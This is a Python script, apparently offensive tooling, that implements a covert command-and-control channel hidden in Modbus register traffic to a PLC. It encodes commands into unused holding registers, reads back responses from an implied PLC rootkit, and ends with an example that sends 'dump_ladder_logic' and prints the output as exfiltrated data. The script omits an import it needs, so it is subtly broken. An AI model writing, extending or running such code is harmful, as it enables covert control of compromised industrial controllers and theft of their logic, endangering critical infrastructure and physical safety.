# modbus_covert_channel.py - Hide C2 communications in Modbus traffic
from pymodbus.client import ModbusTcpClient
import struct

class ModbusCovertChannel:
    def __init__(self, plc_ip, covert_register_start=1000):
        self.client = ModbusTcpClient(plc_ip, port=502)
        self.client.connect()
        self.covert_registers = covert_register_start  # High register numbers (unused)

    def send_command(self, cmd_string):
        """
        Encode command in Modbus register writes
        Appears as normal PLC programming activity
        """
        # Encode ASCII command in 16-bit registers
        # Each register holds 2 characters
        registers = []
        for i in range(0, len(cmd_string), 2):
            chunk = cmd_string[i:i+2].ljust(2, '\x00')
            register_value = struct.unpack('>H', chunk.encode())[0]
            registers.append(register_value)

        # Write to covert registers
        self.client.write_registers(self.covert_registers, registers)

        print(f"[+] Command sent via Modbus: {cmd_string}")

    def receive_response(self):
        """
        Read response from covert registers
        """
        # PLC rootkit writes response to registers
        response_registers = self.client.read_holding_registers(self.covert_registers + 100, 50)

        if response_registers.isError():
            return None

        # Decode registers to ASCII
        response = ""
        for register in response_registers.registers:
            bytes_val = struct.pack('>H', register)
            response += bytes_val.decode('ascii', errors='ignore')

        return response.rstrip('\x00')

# Example: Exfiltrate data via Modbus
channel = ModbusCovertChannel("192.168.1.10")
channel.send_command("dump_ladder_logic")
time.sleep(2)
data = channel.receive_response()
print(f"[+] Exfiltrated: {data}")
